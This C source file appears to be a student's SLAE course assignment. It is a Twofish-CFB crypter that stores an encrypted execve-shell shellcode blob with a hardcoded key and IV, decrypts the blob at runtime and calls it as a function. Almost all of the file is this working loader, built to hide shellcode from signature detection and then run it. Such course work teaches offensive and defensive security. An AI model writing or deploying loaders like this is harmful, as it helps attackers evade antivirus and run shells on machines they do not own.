/*
 * Author: John Stigerwalt
 * SLAE: Assignment #7
 * Program: Two-fish CFB Decrypter  
 * Shellcode Used: Encoded Exceve Shell from Assignment #4
 * Orginal Program Based From: https://gist.github.com/bricef/2436364/
 * Mcrypt: http://mcrypt.sourceforge.net/
 * Mcrypt & GCC Example: http://mcrypt.hellug.gr/lib/mcrypt.3.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>
#include <math.h>
#include <stdint.h>

int decrypt(
    void* buffer,
    int buffer_len,
    char* IV,
    char* key,
    int key_len
    
) {
    
  MCRYPT td = mcrypt_module_open("twofish", NULL, "cfb", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}
  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  return 0;
}

int main() {
    
  MCRYPT td,td2;
  char* IV = "4245454642454546";
  char *key = "0d0a6c3333333337";
  int keysize = 16; /* 128 bits */
  
  /*Encrypted Shellcode*/
  unsigned char buffer[] = "\x27\x58\xc4\xfc\x17\x05\x6d\xba\xd8\x9f\x14\x01\x14\xaf\x6f\xa2\xbd\xbb\x3e\xcc\x92\x9f\x86\xf3\x03\x5c\x7e\x87\x9b\x66\x6b\x3b\x70\x95\x12\x0b\xb7\x7c\x92\x3a\x1e\x34\xb5\x74\x62\x8c\xdc\x5d\x1d\x17\x32\x17\x88\xe1\xe5\xef\x7a\x7f\x10\x83\x9f\x2a\xbf\x62\x08\x14\x89\xe8\xcd\x2e\xbc\x78\xd6\xaa\x43\x3f\x9c\x84\x39\x35\x6e\xbb\xa5\x6e\x36\x18\x26\x17\xaf\xec\x5b\x9c\x1e\x94\x2a\xe3";
  
  /*Length of the Shellcode*/
  int buffer_len = 96;
  int counter;
  
  /** Decrypt the shellcode **/
  decrypt(buffer, buffer_len, IV, key, keysize);
  
  /** Execute the shellcode **/
  printf("Shellcode Length:  %d\n", strlen(buffer));
  int (*ret)() = (int(*)())buffer;
  ret();
  return 0;
}
